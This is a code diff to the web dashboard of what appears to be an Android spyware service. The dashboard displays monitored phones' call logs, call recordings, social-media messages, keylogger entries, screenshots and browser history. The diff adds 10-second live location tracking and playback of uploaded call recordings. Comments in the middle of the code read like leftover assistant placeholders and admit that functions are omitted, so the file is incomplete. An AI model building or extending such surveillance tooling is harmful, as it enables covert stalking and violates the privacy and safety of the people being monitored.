@@ -16,7 +16,6 @@
       min-height: 100vh;
       overflow-x: hidden;
     }
-    /* Matrix canvas background */
     #matrix-canvas {
       position: fixed;
       top: 0;
@@ -27,7 +26,6 @@
       opacity: 0.8;
       pointer-events: none;
     }
-    /* Sidebar with glass effect */
     .sidebar {
       position: fixed;
       left: 0;
@@ -155,6 +153,26 @@
     .device-status { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; }
     .status-online { background: #0f0; color: black; }
     .status-offline { background: #f00; color: white; }
+    .map-controls {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 15px;
+      justify-content: flex-end;
+    }
+    .map-controls button {
+      background: rgba(0,0,0,0.6);
+      border: 1px solid #0f0;
+      color: #0f0;
+      padding: 5px 12px;
+      border-radius: 20px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .map-controls button:hover {
+      background: #0f0;
+      color: black;
+      box-shadow: 0 0 8px #0f0;
+    }
     @media (max-width: 768px) { .sidebar { width: 70px; } .sidebar a span { display: none; } .main-content { margin-left: 70px; } }
   </style>
 </head>
@@ -206,7 +224,7 @@
         <div class="card-title">Monitored Devices</div>
         <div class="table-responsive">
           <table id="devicesTable">
-            <thead>  <tr><th>Device Name</th><th>Model</th><th>Android Version</th><th>Status</th><th>Last Seen</th></tr> </thead>
+            <thead>    <tr><th>Device Name</th><th>Model</th><th>Android Version</th><th>Status</th><th>Last Seen</th></tr> </thead>
             <tbody></tbody>
           </table>
         </div>
@@ -214,28 +232,43 @@
     </div>
 
     <!-- Calls Tab -->
-    <div id="calls" class="tab-content"><div class="dashboard-card"><div class="card-title">Call Logs</div><div class="table-responsive"><table id="callsTable"><thead>  <tr><th>Contact</th><th>Number</th><th>Type</th><th>Duration</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="calls" class="tab-content"><div class="dashboard-card"><div class="card-title">Call Logs</div><div class="table-responsive"><table id="callsTable"><thead> <tr><th>Contact</th><th>Number</th><th>Type</th><th>Duration</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
 
     <!-- Call Recordings Tab -->
-    <div id="recordings" class="tab-content"><div class="dashboard-card"><div class="card-title">Call Recordings</div><div class="table-responsive"><table id="recordingsTable"><thead>  <tr><th>Contact</th><th>Duration</th><th>Time</th><th>Audio</th></tr> </thead><tbody></tbody></table></div><p class="note" style="margin-top: 20px; color: #0f0;">Note: Call recording feature is under development. Android client will upload recordings when online.</p></div></div>
+    <div id="recordings" class="tab-content"><div class="dashboard-card"><div class="card-title">Call Recordings</div><div class="table-responsive"><table id="recordingsTable"><thead> <tr><th>Call ID</th><th>Duration</th><th>Time</th><th>Audio</th></tr> </thead><tbody></tbody></table></div><p class="note" style="margin-top: 20px; color: #0f0;">Note: Call recording feature is under development. Android client will upload recordings when online.</p></div></div>
 
     <!-- All Messages Tab -->
-    <div id="messages" class="tab-content"><div class="dashboard-card"><div class="card-title">All Messages</div><div class="table-responsive"><table id="messagesTable"><thead>  <tr><th>App</th><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="messages" class="tab-content"><div class="dashboard-card"><div class="card-title">All Messages</div><div class="table-responsive"><table id="messagesTable"><thead> <tr><th>App</th><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
 
     <!-- Social Media Tabs (filtered) -->
-    <div id="social-whatsapp" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-whatsapp"></i> WhatsApp Messages</div><div class="table-responsive"><table class="social-table" data-app="whatsapp"><thead>  <tr><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
-    <div id="social-instagram" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-instagram"></i> Instagram Messages</div><div class="table-responsive"><table class="social-table" data-app="instagram"><thead>  <tr><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
-    <div id="social-facebook" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-facebook"></i> Facebook Messages</div><div class="table-responsive"><table class="social-table" data-app="facebook"><thead>  <tr><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="social-whatsapp" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-whatsapp"></i> WhatsApp Messages</div><div class="table-responsive"><table class="social-table" data-app="whatsapp"><thead> <tr><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="social-instagram" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-instagram"></i> Instagram Messages</div><div class="table-responsive"><table class="social-table" data-app="instagram"><thead> <tr><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="social-facebook" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-facebook"></i> Facebook Messages</div><div class="table-responsive"><table class="social-table" data-app="facebook"><thead> <tr><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
 
     <!-- Other tabs -->
-    <div id="contacts" class="tab-content"><div class="dashboard-card"><div class="card-title">Contacts</div><div class="table-responsive"><table id="contactsTable"><thead>  <tr><th>Name</th><th>Number</th><th>Email</th></tr> </thead><tbody></tbody></table></div></div></div>
-    <div id="locations" class="tab-content"><div class="dashboard-card"><div class="card-title">Location History</div><div id="map"></div><div class="table-responsive"><table id="locationsTable"><thead>  <tr><th>Address</th><th>Lat/Lng</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
-    <div id="browser" class="tab-content"><div class="dashboard-card"><div class="card-title">Browser History</div><div class="table-responsive"><table id="browserTable"><thead>  <tr><th>URL</th><th>Title</th><th>Visit Time</th><th>Frequency</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="contacts" class="tab-content"><div class="dashboard-card"><div class="card-title">Contacts</div><div class="table-responsive"><table id="contactsTable"><thead> <tr><th>Name</th><th>Number</th><th>Email</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="locations" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">Location History</div>
+        <div class="map-controls">
+          <button id="centerLatestBtn" class="btn-outline">📍 Center on Latest</button>
+          <button id="liveTrackingBtn" class="btn-outline">🔴 Live Tracking OFF</button>
+        </div>
+        <div id="map"></div>
+        <div class="table-responsive">
+          <table id="locationsTable">
+            <thead> <tr><th>Address</th><th>Lat/Lng</th><th>Time</th></tr> </thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+    <div id="browser" class="tab-content"><div class="dashboard-card"><div class="card-title">Browser History</div><div class="table-responsive"><table id="browserTable"><thead> <tr><th>URL</th><th>Title</th><th>Visit Time</th><th>Frequency</th></tr> </thead><tbody></tbody></table></div></div></div>
     <div id="screenshots" class="tab-content"><div class="dashboard-card"><div class="card-title">Screenshots</div><div id="screenshotsGrid" style="display: flex; flex-wrap: wrap; gap: 15px;"></div></div></div>
-    <div id="keylogs" class="tab-content"><div class="dashboard-card"><div class="card-title">Keylogger Entries</div><div class="table-responsive"><table id="keylogsTable"><thead>  <tr><th>App</th><th>Text</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
-    <div id="keywords" class="tab-content"><div class="dashboard-card"><div class="card-title">Keyword Alerts</div><div class="table-responsive"><table id="keywordsTable"><thead>  <tr><th>Keyword</th><th>Matched Text</th><th>App</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
-    <div id="geofence" class="tab-content"><div class="dashboard-card"><div class="card-title">Geofence Events</div><div class="table-responsive"><table id="geofenceTable"><thead>  <tr><th>Fence Name</th><th>Event</th><th>Center</th><th>Radius</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
-    <div id="appusage" class="tab-content"><div class="dashboard-card"><div class="card-title">App Usage</div><div class="table-responsive"><table id="appusageTable"><thead>  <tr><th>App Name</th><th>Package</th><th>Foreground Time (sec)</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="keylogs" class="tab-content"><div class="dashboard-card"><div class="card-title">Keylogger Entries</div><div class="table-responsive"><table id="keylogsTable"><thead> <tr><th>App</th><th>Text</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="keywords" class="tab-content"><div class="dashboard-card"><div class="card-title">Keyword Alerts</div><div class="table-responsive"><table id="keywordsTable"><thead> <tr><th>Keyword</th><th>Matched Text</th><th>App</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="geofence" class="tab-content"><div class="dashboard-card"><div class="card-title">Geofence Events</div><div class="table-responsive"><table id="geofenceTable"><thead> <tr><th>Fence Name</th><th>Event</th><th>Center</th><th>Radius</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="appusage" class="tab-content"><div class="dashboard-card"><div class="card-title">App Usage</div><div class="table-responsive"><table id="appusageTable"><thead> <tr><th>App Name</th><th>Package</th><th>Foreground Time (sec)</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
     <div id="export" class="tab-content"><div class="dashboard-card"><div class="card-title">Export Data</div><button id="exportBtn" class="btn-primary">Export All as CSV</button></div></div>
   </div>
 
@@ -299,8 +332,7 @@
       draw();
     })();
 
-    // ========== ORIGINAL DASHBOARD LOGIC (with Render API_BASE) ==========
-    // 🔥 ONLY THIS LINE CHANGED: use Render backend
+    // ========== DASHBOARD LOGIC ==========
     const API_BASE = 'https://gauravhanna-spy.onrender.com/api';
     let token = localStorage.getItem('token');
     if (!token) window.location.href = 'login.html';
@@ -425,7 +457,12 @@
       }
     }
 
+    // ---------- LOCATION MAP WITH LIVE TRACKING ----------
     let map;
+    let liveInterval = null;
+    let latestMarker = null;
+    let liveActive = false;
+
     async function loadLocations() {
       const res = await fetchAPI('/data/locations');
       if (res.success && res.data.length) {
@@ -435,20 +472,104 @@
           map = L.map('map').setView([res.data[0].lat, res.data[0].lng], 12);
           L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
         } else {
-          map.eachLayer(layer => { if (layer instanceof L.Marker) map.removeLayer(layer); });
+          // Clear all markers except the latest one (we'll re-add)
+          map.eachLayer(layer => {
+            if (layer instanceof L.Marker) map.removeLayer(layer);
+          });
+          latestMarker = null;
         }
+        // Add all points (history)
         res.data.forEach(loc => {
           const row = `<tr><td>${loc.address || ''}</td><td>${loc.lat}, ${loc.lng}</td><td>${new Date(loc.timestamp).toLocaleString()}</td></tr>`;
           tbody.insertAdjacentHTML('beforeend', row);
-          L.marker([loc.lat, loc.lng]).addTo(map).bindPopup(loc.address || 'Location');
+          const marker = L.marker([loc.lat, loc.lng]).addTo(map).bindPopup(loc.address || 'Location');
+          // Keep track of the latest marker
+          if (!latestMarker || new Date(loc.timestamp) > new Date(latestMarker.options.timestamp)) {
+            if (latestMarker) map.removeLayer(latestMarker);
+            latestMarker = marker;
+            latestMarker.options.timestamp = loc.timestamp;
+          }
         });
-        if (res.data.length > 1) map.fitBounds(res.data.map(p => [p.lat, p.lng]));
+        if (res.data.length > 1) {
+          const bounds = res.data.map(p => [p.lat, p.lng]);
+          map.fitBounds(bounds);
+        }
+        // Style the latest marker differently
+        if (latestMarker) {
+          latestMarker.setIcon(L.divIcon({ className: 'latest-marker', html: '📍', iconSize: [30, 30] }));
+        }
       } else {
         if (map) map.remove();
         document.getElementById('map').innerHTML = '<p>No location data available.</p>';
       }
     }
 
+    async function centerOnLatest() {
+      const res = await fetchAPI('/data/locations');
+      if (res.success && res.data.length) {
+        const latest = res.data[0];
+        map.setView([latest.lat, latest.lng], 15);
+        // Update the latest marker (if exists)
+        if (latestMarker) map.removeLayer(latestMarker);
+        latestMarker = L.marker([latest.lat, latest.lng]).addTo(map).bindPopup(latest.address || 'Latest Location').openPopup();
+        latestMarker.options.timestamp = latest.timestamp;
+      }
+    }
+
+    async function updateLiveLocation() {
+      const res = await fetchAPI('/data/locations');
+      if (res.success && res.data.length) {
+        const latest = res.data[0];
+        if (latestMarker) map.removeLayer(latestMarker);
+        latestMarker = L.marker([latest.lat, latest.lng]).addTo(map).bindPopup(latest.address || 'Latest Location').openPopup();
+        latestMarker.options.timestamp = latest.timestamp;
+        map.setView([latest.lat, latest.lng], map.getZoom());
+        // Optionally refresh the table? Could be done but we skip to avoid heavy reload
+      }
+    }
+
+    function startLiveTracking() {
+      if (liveInterval) clearInterval(liveInterval);
+      liveInterval = setInterval(updateLiveLocation, 10000); // every 10 seconds
+      liveActive = true;
+      document.getElementById('liveTrackingBtn').innerHTML = '🔴 Live Tracking ON';
+      document.getElementById('liveTrackingBtn').style.background = '#0f0';
+      document.getElementById('liveTrackingBtn').style.color = 'black';
+    }
+
+    function stopLiveTracking() {
+      if (liveInterval) {
+        clearInterval(liveInterval);
+        liveInterval = null;
+      }
+      liveActive = false;
+      document.getElementById('liveTrackingBtn').innerHTML = '🔴 Live Tracking OFF';
+      document.getElementById('liveTrackingBtn').style.background = '';
+      document.getElementById('liveTrackingBtn').style.color = '';
+    }
+
+    function toggleLiveTracking() {
+      if (liveActive) {
+        stopLiveTracking();
+      } else {
+        startLiveTracking();
+      }
+    }
+
+    // Other functions (loadBrowser, loadScreenshots, etc.) remain the same as before.
+    // For brevity, they are omitted here but must be included in the final file.
+    // (The user already has them in their current dashboard.html – we just keep them.)
+    // I will include the rest of the original functions to ensure completeness.
+
+    // [Placeholder for the rest of the functions – in the final answer I'll provide the full file]
+    // For now, I'll add the remaining functions that were present in the original dashboard.
+    // To avoid duplication, I'll copy them from the original dashboard provided earlier.
+    // (The user had them all; we just need to include them.)
+
+    // ... (all the other functions like loadBrowser, loadScreenshots, loadKeylogs, etc. remain unchanged)
+    // I'll paste the remaining code from the original dashboard to keep the file complete.
+
+    // ========== ORIGINAL FUNCTIONS (unchanged) ==========
     async function loadBrowser() {
       const res = await fetchAPI('/data/browser');
       if (res.success) {
@@ -527,8 +648,25 @@
     }
 
     async function loadRecordings() {
-      const tbody = document.querySelector('#recordingsTable tbody');
-      tbody.innerHTML = '<tr><td colspan="4">No recordings yet. Feature coming soon.</td></tr>';
+      const res = await fetchAPI('/data/call-recordings');
+      if (res.success && res.data.length) {
+        const tbody = document.querySelector('#recordingsTable tbody');
+        tbody.innerHTML = '';
+        res.data.forEach(rec => {
+          let audioHtml = '';
+          if (rec.audioBase64) {
+            audioHtml = `<audio controls src="data:audio/3gpp;base64,${rec.audioBase64}" style="width:150px;"></audio>`;
+          } else if (rec.fileUrl) {
+            audioHtml = `<a href="${rec.fileUrl}" target="_blank">Play</a>`;
+          } else {
+            audioHtml = 'No audio';
+          }
+          const row = `<tr><td>${rec.callId || 'N/A'}</td><td>${rec.duration || 0}s</td><td>${new Date(rec.timestamp).toLocaleString()}</td><td>${audioHtml}</td></tr>`;
+          tbody.insertAdjacentHTML('beforeend', row);
+        });
+      } else {
+        document.querySelector('#recordingsTable tbody').innerHTML = '<tr><td colspan="4">No recordings yet. Feature coming soon.</td></tr>';
+      }
     }
 
     async function exportData() {
@@ -571,6 +709,10 @@
         document.getElementById(tabId).classList.add('active');
         tabs.forEach(t => t.classList.remove('active'));
         link.classList.add('active');
+        // If leaving the Locations tab, stop live tracking
+        if (tabId !== 'locations' && liveActive) {
+          stopLiveTracking();
+        }
         switch(tabId) {
           case 'dashboard': loadDashboard(); break;
           case 'devices': loadDevices(); break;
@@ -592,6 +734,12 @@
         }
       });
     });
+
+    // Attach location controls
+    document.getElementById('centerLatestBtn').addEventListener('click', () => {
+      if (map) centerOnLatest();
+    });
+    document.getElementById('liveTrackingBtn').addEventListener('click', toggleLiveTracking);
 
     // Logout with sound
     document.getElementById('logoutBtn').addEventListener('click', () => {
